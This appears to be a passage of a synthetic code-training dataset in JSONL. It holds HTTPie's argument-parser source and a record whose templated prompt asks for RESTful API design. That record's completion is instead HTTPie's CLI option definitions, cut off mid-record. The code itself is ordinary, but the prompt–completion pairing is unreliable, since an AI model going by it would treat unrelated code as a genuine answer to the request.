   )\n\n\n# TODO: refactor and design type-annotated data structures\n#       for raw args + parsed args and keep things immutable.\nclass BaseHTTPieArgumentParser(argparse.ArgumentParser):\n    def __init__(self, *args, **kwargs):\n        super().__init__(*args, **kwargs)\n        self.env = None\n        self.args = None\n        self.has_stdin_data = False\n        self.has_input_data = False\n\n    # noinspection PyMethodOverriding\n    def parse_args(\n        self,\n        env: Environment,\n        args=None,\n        namespace=None\n    ) -> argparse.Namespace:\n        self.env = env\n        self.args, no_options = self.parse_known_args(args, namespace)\n        if self.args.debug:\n            self.args.traceback = True\n        self.has_stdin_data = (\n            self.env.stdin\n            and not getattr(self.args, 'ignore_stdin', False)\n            and not self.env.stdin_isatty\n        )\n        self.has_input_data = self.has_stdin_data or getattr(self.args, 'raw', None) is not None\n        return self.args\n\n    # noinspection PyShadowingBuiltins\n    def _print_message(self, message, file=None):\n        # Sneak in our stderr/stdout.\n        if hasattr(self, 'root'):\n            env = self.root.env\n        else:\n            env = self.env\n\n        if env is not None:\n            file = {\n                sys.stdout: env.stdout,\n                sys.stderr: env.stderr,\n                None: env.stderr\n            }.get(file, file)\n\n        if not hasattr(file, 'buffer') and isinstance(message, str):\n            message = message.encode(env.stdout_encoding)\n        super()._print_message(message, file)\n\n\nclass HTTPieManagerArgumentParser(BaseHTTPieArgumentParser):\n    def parse_known_args(self, args=None, namespace=None):\n        try:\n            return super().parse_known_args(args, namespace)\n        except SystemExit as exc:\n            if not hasattr(self, 'root') and exc.code == 2:  # Argument Parser Error\n                raise argparse.ArgumentError(None, None)\n            raise\n\n\nclass HTTPieArgumentParser(BaseHTTPieArgumentParser):\n    \"\"\"Adds additional logic to `argparse.ArgumentParser`.\n\n    Handles all input (CLI args, file args, stdin), applies defaults,\n    and performs extra validation.\n\n    \"\"\"\n\n    def __init__(self, *args, formatter_class=HTTPieHelpFormatter, **kwargs):\n        kwargs.setdefault('add_help', False)\n        super().__init__(*args, formatter_class=formatter_class, **kwargs)\n\n    # noinspection PyMethodOverriding\n    def parse_args(\n        self,\n        env: Environment,\n        args=None,\n        namespace=None\n    ) -> argparse.Namespace:\n        self.env = env\n        self.env.args = namespace = namespace or argparse.Namespace()\n        self.args, no_options = super().parse_known_args(args, namespace)\n        if self.args.debug:\n            self.args.traceback = True\n        self.has_stdin_data = (\n            self.env.stdin\n            and not self.args.ignore_stdin\n            and not self.env.stdin_isatty\n        )\n        self.has_input_data = self.has_stdin_data or self.args.raw is not None\n        # Arguments processing and environment setup.\n        self._apply_no_options(no_options)\n        self._process_request_type()\n        self._process_download_options()\n        self._setup_standard_streams()\n        self._process_output_options()\n        self._process_pretty_options()\n        self._process_format_options()\n        self._guess_method()\n        self._parse_items()\n        self._process_url()\n        self._process_auth()\n        self._process_ssl_cert()\n\n        if self.args.raw is not None:\n            self._body_from_input(self.args.raw)\n        elif self.has_stdin_data:\n            self._body_from_file(self.env.stdin)\n\n        if self.args.compress:\n            # TODO: allow --compress with --chunked / --multipart\n            if self.args.chunked:\n                self.error('cannot combine --compress and --chunked')\n            if self.args.multipart:\n                self.error('cannot combine --compress and --multipart')\n\n        return self.args\n\n    def _process_request_type(self):\n        request_type = self.args.request_type\n        self.args.json = request_type is RequestType.JSON\n        self.args.multipart = request_type is RequestType.MULTIPART\n        self.args.form = request_type in {\n            RequestType.FORM,\n            RequestType.MULTIPART,\n        }\n\n    def _process_url(self):\n        if self.args.url.startswith('://'):\n            # Paste URL & add space shortcut: `http ://pie.dev` → `http://pie.dev`\n            self.args.url = self.args.url[3:]\n        if not URL_SCHEME_RE.match(self.args.url):\n            if os.path.basename(self.env.program_name) == 'https':\n                scheme = 'https://'\n            else:\n                scheme = self.args.default_scheme + '://'\n\n            # See if we're using curl style shorthand for localhost (:3000/foo)\n            shorthand = re.match(r'^:(?!:)(\\d*)(/?.*)$', self.args.url)\n            if shorthand:\n                port = shorthand.group(1)\n                rest = shorthand.group(2)\n                self.args.url = scheme + 'localhost'\n                if port:\n                    self.args.url += ':' + port\n                self.args.url += rest\n            else:\n                self.args.url = scheme + self.args.url\n\n    def _setup_standard_streams(self):\n        \"\"\"\n        Modify `env.stdout` and `env.stdout_isatty` based on args, if needed.\n\n        \"\"\"\n\n        self.args.output_file_specified = bool(self.args.output_file)\n        if self.args.download:\n            # FIXME: Come up with a cleaner solution.\n            if not self.args.output_file and not self.env.stdout_isatty:\n                # Use stdout as the download output file.\n                self.args.output_file = self.env.stdout\n            # With `--download`, we write everything that would normally go to\n            # `stdout` to `stderr` instead. Let's replace the stream so that\n            # we don't have to use many `if`s throughout the codebase.\n            # The response body will be treated separately.\n            self.env.stdout = self.env.stderr\n            self.env.stdout_isatty = self.env.stderr_isatty\n\n        elif self.args.output_file:\n            # When not `--download`ing, then `--output` simply replaces\n            # `stdout`. The file is opened for appending, which isn't what\n            # we want in this case.\n            self.args.output_file.seek(0)\n            try:\n                self.args.output_file.truncate()\n            except OSError as e:\n                if e.errno == errno.EINVAL:\n                    # E.g. /dev/null on Linux.\n                    pass\n                else:\n                    raise\n            self.env.stdout = self.args.output_file\n            self.env.stdout_isatty = False\n\n        if self.args.quiet:\n            self.env.quiet = self.args.quiet\n            self.env.stderr = self.env.devnull\n            if not (self.args.output_file_specified and not self.args.download):\n                self.env.stdout = self.env.devnull\n            self.env.apply_warnings_filter()\n\n    def _process_ssl_cert(self):\n        from httpie.ssl_ import _is_key_file_encrypted\n\n        if self.args.cert_key_pass is None:\n            self.args.cert_key_pass = SSLCredentials(None)\n\n        if (\n            self.args.cert_key is not None\n            and self.args.cert_key_pass.value is None\n            and _is_key_file_encrypted(self.args.cert_key)\n        ):\n            self.args.cert_key_pass.prompt_password(self.args.cert_key)\n\n    def _process_auth(self):\n        # TODO: refactor & simplify this method.\n        self.args.auth_plugin = None\n        default_auth_plugin = plugin_manager.get_auth_plugins()[0]\n        auth_type_set = self.args.auth_type is not None\n        url = urlsplit(self.args.url)\n\n        if self.args.auth is None and not auth_type_set:\n            if url.username is not None:\n                # Handle http://username:password@hostname/\n                username = url.username\n                password = url.password or ''\n                self.args.auth = AuthCredentials(\n                    key=username,\n                    value=password,\n                    sep=SEPARATOR_CREDENTIALS,\n                    orig=SEPARATOR_CREDENTIALS.join([username, password])\n                )\n\n        if self.args.auth is not None or auth_type_set:\n            if not self.args.auth_type:\n                self.args.auth_type = default_auth_plugin.auth_type\n            plugin = plugin_manager.get_auth_plugin(self.args.auth_type)()\n\n            if (not self.args.ignore_netrc\n                    and self.args.auth is None\n                    and plugin.netrc_parse):\n                # Only host needed, so it’s OK URL not finalized.\n                netrc_credentials = get_netrc_auth(self.args.url)\n                if netrc_credentials:\n                    self.args.auth = AuthCredentials(\n                        key=netrc_credentials[0],\n                        value=netrc_credentials[1],\n                        sep=SEPARATOR_CREDENTIALS,\n                        orig=SEPARATOR_CREDENTIALS.join(netrc_credentials)\n                    )\n\n            if plugin.auth_require and self.args.auth is None:\n                self.error('--auth required')\n\n            plugin.raw_auth = self.args.auth\n            self.args.auth_plugin = plugin\n            already_parsed = isinstance(self.args.auth, AuthCredentials)\n\n            if self.args.auth is None or not plugin.auth_parse:\n                self.args.auth = plugin.get_auth()\n            else:\n                if already_parsed:\n                    # from the URL\n                    credentials = self.args.auth\n                else:\n                    credentials = parse_auth(self.args.auth)\n\n                if (not credentials.has_password()\n                        and plugin.prompt_password):\n                    if self.args.ignore_stdin:\n                        # Non-tty stdin read by now\n                        self.error(\n                            'Unable to prompt for passwords because'\n                            ' --ignore-stdin is set.'\n                        )\n                    credentials.prompt_password(url.netloc)\n\n                if (credentials.key and credentials.value):\n                    plugin.raw_auth = credentials.key + \":\" + credentials.value\n\n                self.args.auth = plugin.get_auth(\n                    username=credentials.key,\n                    password=credentials.value,\n                )\n        if not self.args.auth and self.args.ignore_netrc:\n            # Set a no-op auth to force requests to ignore .netrc\n            # <https://github.com/psf/requests/issues/2773#issuecomment-174312831>\n            self.args.auth = ExplicitNullAuth()\n\n    def _apply_no_options(self, no_options):\n        \"\"\"For every `--no-OPTION` in `no_options`, set `args.OPTION` to\n        its default value. This allows for un-setting of options, e.g.,\n        specified in config.\n\n        \"\"\"\n        invalid = []\n\n        for option in no_options:\n            if not option.startswith('--no-'):\n                invalid.append(option)\n                continue\n\n            # --no-option => --option\n            inverted = '--' + option[5:]\n            for action in self._actions:\n                if inverted in action.option_strings:\n                    setattr(self.args, action.dest, action.default)\n                    break\n            else:\n                invalid.append(option)\n\n        if invalid:\n            self.error(f'unrecognized arguments: {\" \".join(invalid)}')\n\n    def _body_from_file(self, fd):\n        \"\"\"Read the data from a file-like object.\n\n        Bytes are always read.\n\n        \"\"\"\n        self._ensure_one_data_source(self.args.data, self.args.files)\n        self.args.data = getattr(fd, 'buffer', fd)\n\n    def _body_from_input(self, data):\n        \"\"\"Read the data from the CLI.\n\n        \"\"\"\n        self._ensure_one_data_source(self.has_stdin_data, self.args.data,\n                                     self.args.files)\n        self.args.data = data.encode()\n\n    def _ensure_one_data_source(self, *other_sources):\n        \"\"\"There can only be one source of input request data.\n\n        \"\"\"\n        if any(other_sources):\n            self.error('Request body (from stdin, --raw or a file) and request '\n                       'data (key=value) cannot be mixed. Pass '\n                       '--ignore-stdin to let key/value take priority. '\n                       'See https://httpie.io/docs#scripting for details.')\n\n    def _guess_method(self):\n        \"\"\"Set `args.method` if not specified to either POST or GET\n        based on whether the request has data or not.\n\n        \"\"\"\n        if self.args.method is None:\n            # Invoked as `http URL'.\n            assert not self.args.request_items\n            if self.has_input_data:\n                self.args.method = HTTP_POST\n            else:\n                self.args.method = HTTP_GET\n\n        # FIXME: False positive, e.g., \"localhost\" matches but is a valid URL.\n        elif not re.match('^[a-zA-Z]+$', self.args.method):\n            # Invoked as `http URL item+'. The URL is now in `args.method`\n            # and the first ITEM is now incorrectly in `args.url`.\n            try:\n                # Parse the URL as an ITEM and store it as the first ITEM arg.\n                self.args.request_items.insert(0, KeyValueArgType(\n                    *SEPARATOR_GROUP_ALL_ITEMS).__call__(self.args.url))\n\n            except argparse.ArgumentTypeError as e:\n                if self.args.traceback:\n                    raise\n                self.error(e.args[0])\n\n            else:\n                # Set the URL correctly\n                self.args.url = self.args.method\n                # Infer the method\n                has_data = (\n                    self.has_input_data\n                    or any(\n                        item.sep in SEPARATOR_GROUP_DATA_ITEMS\n                        for item in self.args.request_items)\n                )\n                self.args.method = HTTP_POST if has_data else HTTP_GET\n\n    def _parse_items(self):\n        \"\"\"\n        Parse `args.request_items` into `args.headers`, `args.data`,\n        `args.params`, and `args.files`.\n\n        \"\"\"\n        try:\n            request_items = RequestItems.from_args(\n                request_item_args=self.args.request_items,\n                request_type=self.args.request_type,\n            )\n        except ParseError as e:\n            if self.args.traceback:\n                raise\n            self.error(e.args[0])\n        else:\n            self.args.headers = request_items.headers\n            self.args.data = request_items.data\n            self.args.files = request_items.files\n            self.args.params = request_items.params\n            self.args.multipart_data = request_items.multipart_data\n\n        if self.args.files and not self.args.form:\n            # `http url @/path/to/file`\n            request_file = None\n            for key, file in self.args.files.items():\n                if key != '':\n                    self.error(\n                        'Invalid file fields (perhaps you meant --form?):'\n                        f' {\",\".join(self.args.files.keys())}')\n                if request_file is not None:\n                    self.error(\"Can't read request from multiple files\")\n                request_file = file\n\n            fn, fd, ct = request_file\n            self.args.files = {}\n\n            self._body_from_file(fd)\n\n            if 'Content-Type' not in self.args.headers:\n                content_type = get_content_type(fn)\n                if content_type:\n                    self.args.headers['Content-Type'] = content_type\n\n    def _process_output_options(self):\n        \"\"\"Apply defaults to output options, or validate the provided ones.\n\n        The default output options are stdout-type-sensitive.\n\n        \"\"\"\n\n        def check_options(value, option):\n            unknown = set(value) - OUTPUT_OPTIONS\n            if unknown:\n                self.error(f'Unknown output options: {option}={\",\".join(unknown)}')\n\n        if self.args.verbose:\n            self.args.all = True\n\n        if self.args.output_options is None:\n            if self.args.verbose >= 2:\n                self.args.output_options = ''.join(OUTPUT_OPTIONS)\n            elif self.args.verbose == 1:\n                self.args.output_options = ''.join(BASE_OUTPUT_OPTIONS)\n            elif self.args.offline:\n                self.args.output_options = OUTPUT_OPTIONS_DEFAULT_OFFLINE\n            elif not self.env.stdout_isatty:\n                self.args.output_options = OUTPUT_OPTIONS_DEFAULT_STDOUT_REDIRECTED\n            else:\n                self.args.output_options = OUTPUT_OPTIONS_DEFAULT\n\n        if self.args.output_options_history is None:\n            self.args.output_options_history = self.args.output_options\n\n        check_options(self.args.output_options, '--print')\n        check_options(self.args.output_options_history, '--history-print')\n\n        if self.args.download and OUT_RESP_BODY in self.args.output_options:\n            # Response body is always downloaded with --download and it goes\n            # through a different routine, so we remove it.\n            self.args.output_options = str(\n                set(self.args.output_options) - set(OUT_RESP_BODY))\n\n    def _process_pretty_options(self):\n        if self.args.prettify == PRETTY_STDOUT_TTY_ONLY:\n            self.args.prettify = PRETTY_MAP[\n                'all' if self.env.stdout_isatty else 'none']\n        elif (self.args.prettify and self.env.is_windows\n              and self.args.output_file):\n            self.error('Only terminal output can be colorized on Windows.')\n        else:\n            # noinspection PyTypeChecker\n            self.args.prettify = PRETTY_MAP[self.args.prettify]\n\n    def _process_download_options(self):\n        if self.args.offline:\n            self.args.download = False\n            self.args.download_resume = False\n            return\n        if not self.args.download:\n            if self.args.download_resume:\n                self.error('--continue only works with --download')\n        if self.args.download_resume and not (\n                self.args.download and self.args.output_file):\n            self.error('--continue requires --output to be specified')\n\n    def _process_format_options(self):\n        format_options = self.args.format_options or []\n        parsed_options = PARSED_DEFAULT_FORMAT_OPTIONS\n        for options_group in format_options:\n            parsed_options = parse_format_options(options_group, defaults=parsed_options)\n        self.args.format_options = parsed_options\n\n    def print_manual(self):\n        from httpie.output.ui import man_pages\n\n        if man_pages.is_available(self.env.program_name):\n            man_pages.display_for(self.env, self.env.program_name)\n            return None\n\n        text = self.format_help()\n        with self.env.rich_console.pager():\n            self.env.rich_console.print(\n                text,\n                highlight=False\n            )\n\n    def print_usage(self, file):\n        from rich.text import Text\n        from httpie.output.ui import rich_help\n\n        whitelist = set()\n        _, exception, _ = sys.exc_info()\n        if (\n            isinstance(exception, argparse.ArgumentError)\n            and len(exception.args) >= 1\n            and isinstance(exception.args[0], argparse.Action)\n            and exception.args[0].option_strings\n        ):\n            # add_usage path is also taken when you pass an invalid option,\n            # e.g --style=invalid. If something like that happens, we want\n            # to include to action that caused to the invalid usage into\n            # the list of actions we are displaying.\n            whitelist.add(exception.args[0].option_strings[0])\n\n        usage_text = Text('usage', style='bold')\n        usage_text.append(':\\n    ')\n        usage_text.append(rich_help.to_usage(self.spec, whitelist=whitelist))\n        self.env.rich_error_console.print(usage_text)\n\n    def error(self, message):\n        \"\"\"Prints a usage message incorporating the message to stderr and\n        exits.\"\"\"\n        self.print_usage(sys.stderr)\n        self.env.rich_error_console.print(\n            dedent(\n                f'''\n                [bold]error[/bold]:\n                    {message}\n\n                [bold]for more information[/bold]:\n                    run '{self.prog} --help' or visit https://httpie.io/docs/cli\n                '''.rstrip()\n            )\n        )\n        self.exit(2)\n", "metadata": {"source": "github.com/httpie/cli", "file_path": "httpie/cli/argparser.py", "language": "python", "complexity": "complex", "star_count": 36176, "quality_score": 1.0, "features": {"has_microservices": false, "has_api_design": true, "has_load_balancing": false, "has_caching": false, "has_database_design": false, "has_security": true, "has_monitoring": true, "has_scaling": false, "has_cloud_patterns": false, "has_containers": false, "has_diagrams": false, "line_count": 614}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "api_design", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate function-based implementation for Design RESTful API architecture with proper versioning and documentation\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "from __future__ import annotations\n\nimport os\nimport textwrap\nfrom argparse import FileType\n\nfrom httpie import __doc__, __version__\nfrom httpie.cli.argtypes import (KeyValueArgType, SessionNameValidator,\n                                 SSLCredentials, readable_file_arg,\n                                 response_charset_type, response_mime_type)\nfrom httpie.cli.constants import (BASE_OUTPUT_OPTIONS, DEFAULT_FORMAT_OPTIONS,\n                                  OUT_REQ_BODY, OUT_REQ_HEAD, OUT_RESP_BODY,\n                                  OUT_RESP_HEAD, OUT_RESP_META, OUTPUT_OPTIONS,\n                                  OUTPUT_OPTIONS_DEFAULT, PRETTY_MAP,\n                                  PRETTY_STDOUT_TTY_ONLY,\n                                  SEPARATOR_GROUP_ALL_ITEMS, SEPARATOR_PROXY,\n                                  SORTED_FORMAT_OPTIONS_STRING,\n                                  UNSORTED_FORMAT_OPTIONS_STRING, RequestType)\nfrom httpie.cli.options import ParserSpec, Qualifiers, to_argparse\nfrom httpie.output.formatters.colors import (AUTO_STYLE, DEFAULT_STYLE, BUNDLED_STYLES,\n                                             get_available_styles)\nfrom httpie.plugins.builtin import BuiltinAuthPlugin\nfrom httpie.plugins.registry import plugin_manager\nfrom httpie.ssl_ import AVAILABLE_SSL_VERSION_ARG_MAPPING, DEFAULT_SSL_CIPHERS_STRING\n\n\n# Man pages are static (built when making a release).\n# We use this check to not include generated, system-specific information there (e.g., default --ciphers).\nIS_MAN_PAGE = bool(os.environ.get('HTTPIE_BUILDING_MAN_PAGES'))\n\n\noptions = ParserSpec(\n    'http',\n    description=f'{__doc__.strip()} <https://httpie.io>',\n    epilog=\"\"\"\n    For every --OPTION there is also a --no-OPTION that reverts OPTION\n    to its default value.\n\n    Suggestions and bug reports are greatly appreciated:\n        https://github.com/httpie/cli/issues\n    \"\"\",\n    source_file=__file__\n)\n\n#######################################################################\n# Positional arguments.\n#######################################################################\n\npositional_arguments = options.add_group(\n    'Positional arguments',\n    description=\"\"\"\n    These arguments come after any flags and in the order they are listed here.\n    Only URL is required.\n    \"\"\",\n)\n\npositional_arguments.add_argument(\n    dest='method',\n    metavar='METHOD',\n    nargs=Qualifiers.OPTIONAL,\n    default=None,\n    short_help='The HTTP method to be used for the request (GET, POST, PUT, DELETE, ...).',\n    help=\"\"\"\n    The HTTP method to be used for the request (GET, POST, PUT, DELETE, ...).\n\n    This argument can be omitted in which case HTTPie will use POST if there\n    is some data to be sent, otherwise GET:\n\n        $ http example.org               # => GET\n        $ http example.org hello=world   # => POST\n\n    \"\"\",\n)\npositional_arguments.add_argument(\n    dest='url',\n    metavar='URL',\n    short_help='The request URL.',\n    help=\"\"\"\n    The request URL. Scheme defaults to 'http://' if the URL\n    does not include one. (You can override this with: --default-scheme=http/https)\n\n    You can also use a shorthand for localhost\n\n        $ http :3000                    # => http://localhost:3000\n        $ http :/foo                    # => http://localhost/foo\n\n    \"\"\",\n)\npositional_arguments.add_argument(\n    dest='request_items',\n    metavar='REQUEST_ITEM',\n    nargs=Qualifiers.ZERO_OR_MORE,\n    default=None,\n    type=KeyValueArgType(*SEPARATOR_GROUP_ALL_ITEMS),\n    short_help=(\n        'HTTPie’s request items syntax for specifying HTTP headers, JSON/Form'\n        'data, files, and URL parameters.'\n    ),\n    nested_options=[\n        ('HTTP Headers', 'Name:Value', 'Arbitrary HTTP header, e.g X-API-Token:123'),\n        ('URL Parameters', 'name==value', 'Querystring parameter to the URL, e.g limit==50'),\n        ('Data Fields', 'field=value', 'Data fields to be serialized as JSON (default) or Form Data (with --form)'),\n        ('Raw JSON Fields', 'field:=json', 'Data field for real JSON types.'),\n        ('File upload Fields', 'field@/dir/file', 'Path field for uploading a file.'),\n    ],\n    help=r\"\"\"\n    Optional key-value pairs to be included in the request. The separator used\n    determines the type:\n\n    ':' HTTP headers:\n\n        Referer:https://httpie.io  Cookie:foo=bar  User-Agent:bacon/1.0\n\n    '==' URL parameters to be appended to the request URI:\n\n        search==httpie\n\n    '=' Data fields to be serialized into a JSON object (with --json, -j)\n        or form data (with --form, -f):\n\n        name=HTTPie  language=Python  description='CLI HTTP client'\n\n    ':=' Non-string JSON data fields (only with --json, -j):\n\n        awesome:=true  amount:=42  colors:='[\"red\", \"green\", \"blue\"]'\n\n    '@' Form file fields (only with --form or --multipart):\n\n        cv@~/Documents/CV.pdf\n        cv@'~/Documents/CV.pdf;type=application/pdf'\n\n    '=@' A data field like '=', but takes a file path and embeds its content:\n\n        essay=@Documents/essay.txt\n\n    ':=@' A raw JSON field like ':=', but takes a file path and embeds its content:\n\n        package:=@./package.json\n\n    You can use a backslash to escape a colliding separator in the field name:\n\n        field-name-with\\:colon=value\n\n    \"\"\",\n)\n\n#######################################################################\n# Content type.\n#######################################################################\n\ncontent_types = options.add_group('Predefined content types')\n\ncontent_types.add_argument(\n    '--json',\n    '-j',\n    action='store_const',\n    const=RequestType.JSON,\n    dest='request_type',\n    short_help='(default) Serialize data items from the command line as a JSON object.',\n    help=\"\"\"\n    (default) Data items from the command line are serialized as a JSON object.\n    The Content-Type and Accept headers are set to application/json\n    (if not specified).\n\n    \"\"\",\n)\ncontent_types.add_argument(\n    '--form',\n    '-f',\n    action='store_const',\n    const=RequestType.FORM,\n    dest='request_type',\n    short_help='Serialize data items from the command line as form field data.',\n    help=\"\"\"\n    Data items from the command line are serialized as form fields.\n\n    The Content-Type is set to application/x-www-form-urlencoded (if not\n    specified). The presence of any file fields results in a\n    multipart/form-data request.\n\n    \"\"\",\n)\ncontent_types.add_argument(\n    '--multipart',\n    action='store_const',\n    const=RequestType.MULTIPART,\n    dest='request_type',\n    short_help=(\n        'Similar to --form, but always sends a multipart/form-data '\n        'request (i.e., even without files).'\n    )\n)\ncontent_types.add_argument(\n    '--boundary',\n    short_help=(\n        'Specify a custom boundary string for multipart/form-data requests. '\n        'Only has effect only together with --form.'\n    )\n)\ncontent_types.add_argument(\n    '--raw',\n    short_help='Pass raw request data without extra processing.',\n    help=\"\"\"\n    This option allows you to pass raw request data without extra processing\n    (as opposed to the structured request items syntax):\n\n        $ http --raw='data' pie.dev/post\n\n    You can achieve the same by piping the data via stdin:\n\n        $ echo data | http pie.dev/post\n\n    Or have HTTPie load the raw data from a file:\n\n        $ http pie.dev/post @data.txt\n\n\n    \"\"\",\n)\n\n#######################################################################\n# Content processing.\n#######################################################################\n\nprocessing_options = options.add_group('Content processing options')\n\nprocessing_options.add_argument(\n    '--compress',\n    '-x',\n    action='count',\n    default=0,\n    short_help='Compress the content with Deflate algorithm.',\n    help=\"\"\"\n    Content compressed (encoded) with Deflate algorithm.\n    The Content-Encoding header is set to deflate.\n\n    Compression is skipped if it appears that compression ratio is\n    negative. Compression can be forced by repeating the argument.\n\n    \"\"\",\n)\n\n\n#######################################################################\n# Output processing\n#######################################################################\n\n\ndef format_style_help(available_styles, *, isolation_mode: bool = False):\n    text = \"\"\"\n    Output coloring style (default is \"{default}\"). It can be one of:\n\n        {available_styles}\n    \"\"\"\n    if isolation_mode:\n        text += '\\n\\n'\n        text += 'For finding out all available styles in your system, try:\\n\\n'\n        text += '    $ http --style\\n'\n    text += textwrap.dedent(\"\"\"\n        The \"{auto_style}\" style follows your terminal's ANSI color styles.\n        For non-{auto_style} styles to work properly, please make sure that the\n        $TERM environment variable is set to \"xterm-256color\" or similar\n        (e.g., via `export TERM=xterm-256color' in your ~/.bashrc).\n    \"\"\")\n\n    if isolation_mode:\n        available_styles = sorted(BUNDLED_STYLES)\n\n    available_styles_text = '\\n'.join(\n        f'    {line.strip()}'\n        for line in textwrap.wrap(', '.join(available_styles), 60)\n    ).strip()\n    return text.format(\n        default=DEFAULT_STYLE,\n        available_styles=available_styles_text,\n        auto_style=AUTO_STYLE,\n    )\n\n\n_sorted_kwargs = {\n    'action': 'append_const',\n    'const': SORTED_FORMAT_OPTIONS_STRING,\n    'dest': 'format_options',\n}\n_unsorted_kwargs = {\n    'action': 'append_const',\n    'const': UNSORTED_FORMAT_OPTIONS_STRING,\n    'dest': 'format_options',\n}\n\noutput_processing = options.add_group('Output processing')\n\noutput_processing.add_argument(\n    '--pretty',\n    dest='prettify',\n    default=PRETTY_STDOUT_TTY_ONLY,\n    choices=sorted(PRETTY_MAP.keys()),\n    short_help='Control the processing of console outputs.',\n    help=\"\"\"\n    Controls output processing. The value can be \"none\" to not prettify\n    the output (default for redirected output), \"all\" to apply both colors\n    and formatting (default for terminal output), \"colors\", or \"format\".\n\n    \"\"\",\n)\noutput_processing.add_argument(\n    '--style',\n    '-s',\n    dest='style',\n    metavar='STYLE',\n    default=DEFAULT_STYLE,\n    action='lazy_choices',\n    getter=get_available_styles,\n    short_help=f'Output coloring style (default is \"{DEFAULT_STYLE}\").',\n    help_formatter=format_style_help,\n)\n\n# The closest approx. of the documented resetting to default via --no-<option>.\n# We hide them from the doc because they act only as low-level aliases here.\noutput_processing.add_argument(\n    '--no-unsorted', **_sorted_kwargs, help=Qualifiers.SUPPRESS\n)\noutput_processing.add_argument(\n    '--no-sorted', **_unsorted_kwargs, help=Qualifiers.SUPPRESS\n)\n\noutput_processing.add_argument(\n    '--unsorted',\n    **_unsorted_kwargs,\n    short_help='Disables all sorting while formatting output.',\n    help=f\"\"\"\n    Disables all sorting while formatting output. It is a shortcut for:\n\n        --format-options={UNSORTED_FORMAT_OPTIONS_STRING}\n\n    \"\"\",\n)\noutput_processing.add_argument(\n    '--sorted',\n    **_sorted_kwargs,\n    short_help='Re-enables all sorting options while formatting output.',\n    help=f\"\"\"\n    Re-enables all sorting options while formatting output. It is a shortcut for:\n\n        --format-options={SORTED_FORMAT_OPTIONS_STRING}\n\n    \"\"\",\n)\noutput_processing.add_argument(\n    '--response-charset',\n    metavar='ENCODING',\n    type=response_charset_type,\n    short_help='Override the response encoding for terminal display purposes.',\n    help=\"\"\"\n    Override the response encoding for terminal display purposes, e.g.:\n\n        --response-charset=utf8\n        --response-charset=big5\n\n    \"\"\",\n)\noutput_processing.add_argument(\n    '--response-mime',\n    metavar='MIME_TYPE',\n    type=response_mime_type,\n    short_help='Override the response mime type for coloring and formatting for the terminal.',\n    help=\"\"\"\n    Override the response mime type for coloring and formatting for the terminal, e.g.:\n\n        --response-mime=application/json\n        --response-mime=text/xml\n\n    \"\"\",\n)\noutput_processing.add_argument(\n    '--format-options',\n    action='append',\n    short_help='Controls output formatting.',\n    help=\"\"\"\n    Controls output formatting. Only relevant when formatting is enabled\n    through (explicit or implied) --pretty=all or --pretty=format.\n    The following are the default options:\n\n        {option_list}\n\n    You may use this option multiple times, as well as specify multiple\n    comma-separated options at the same time. For example, this modifies the\n    settings to disable the sorting of JSON keys, and sets the indent size to 2:\n\n        --format-options json.sort_keys:false,json.indent:2\n\n    This is something you will typically put into your config file.\n\n    \"\"\".format(\n        option_list='\\n'.join(\n            f'        {option}' for option in DEFAULT_FORMAT_OPTIONS\n        ).strip()\n    ),\n)\n\n#######################################################################\n# Output options\n#######################################################################\n\noutput_options = options.add_group('Output options')\n\noutput_options.add_argument(\n    '--print',\n    '-p',\n    dest='output_options',\n    metavar='WHAT',\n    short_help='Options to specify what the console output should contain.',\n    help=f\"\"\"\n    String specifying what the output should contain:\n\n        '{OUT_REQ_HEAD}' request headers\n        '{OUT_REQ_BODY}' request body\n        '{OUT_RESP_HEAD}' response headers\n        '{OUT_RESP_BODY}' response body\n        '{OUT_RESP_META}' response metadata\n\n    The default behaviour is '{OUTPUT_OPTIONS_DEFAULT}' (i.e., the response\n    headers and body is printed), if standard output is not redirected.\n    If the output is piped to another program or to a file, then only the\n    response body is printed by default.\n\n    \"\"\",\n)\noutput_options.add_argument(\n    '--headers',\n    '-h',\n    dest='output_options',\n    action='store_const',\n    const=OUT_RESP_HEAD,\n    short_help='Print only the response headers.',\n    help=f\"\"\"\n    Print only the response headers. Shortcut for --print={OUT_RESP_HEAD}.\n\n    \"\"\",\n)\noutput_options.add_argument(\n    '--meta',\n    '-m',\n    dest='output_options',\n    action='store_const',\n    const=OUT_RESP_META,\n    short_help='Print only the response metadata.',\n    help=f\"\"\"\n    Print only the response metadata. Shortcut for --print={OUT_RESP_META}.\n\n    \"\"\",\n)\noutput_options.add_argument(\n    '--body',\n    '-b',\n    dest='output_options',\n    action='store_const',\n    const=OUT_RESP_BODY,\n    short_help='Print only the response body.',\n    help=f\"\"\"\n    Print only the response body. Shortcut for --print={OUT_RESP_BODY}.\n\n    \"\"\",\n)\n\noutput_options.add_argument(\n    '--verbose',\n    '-v',\n    dest='verbose',\n    action='count',\n    default=0,\n    short_help='Make output more verbose.',\n    help=f\"\"\"\n    Verbose output. For the level one (with single `-v`/`--verbose`), print\n    the whole request as well as the response. Also print any intermediary\n    requests/responses (such as redirects). For the second level and higher,\n    print these as well as the response metadata.\n\n    Level one is a shortcut for: --all --print={''.join(sorted(BASE_OUTPUT_OPTIONS))}\n    Level two is a shortcut for: --all --print={''.join(sorted(OUTPUT_OPTIONS))}\n    \"\"\",\n)\noutput_options.add_argument(\n    '--all',\n    default=False,\n    action='store_true',\n    short_help='Show any intermediary requests/responses.',\n    help=\"\"\"\n    By default, only the final request/response is shown. Use this flag to show\n    any intermediary requests/responses as well. Intermediary requests include\n    followed redirects (with --follow), the first unauthorized request when\n    Digest auth is used (--auth=digest), etc.\n\n    \"\"\",\n)\noutput_options.add_argument(\n    '--history-print',\n    '-P',\n    dest='output_options_history',\n    metavar='WHAT',\n    help=Qualifiers.SUPPRESS,\n)\noutput_options.add_argument(\n    '--stream',\n    '-S',\n    action='store_true',\n    default=False,\n    short_help='Always stream the response body by line, i.e., behave like `tail -f`.',\n    help=\"\"\"\n    Always stream the response body by line, i.e., behave like `tail -f'.\n\n    Without --stream and with --pretty (either set or implied),\n    HTTPie fetches the whole response before it outputs the processed data.\n\n    Set this option when you want to continuously display a prettified\n    long-lived response, such as one from the Twitter streaming API.\n\n    It is useful also without --pretty: It ensures that the output is flushed\n    more often and in smaller chunks.\n\n    \"\"\",\n)\noutput_options.add_argument(\n    '--output',\n    '-o',\n    type=FileType('a+b'),\n    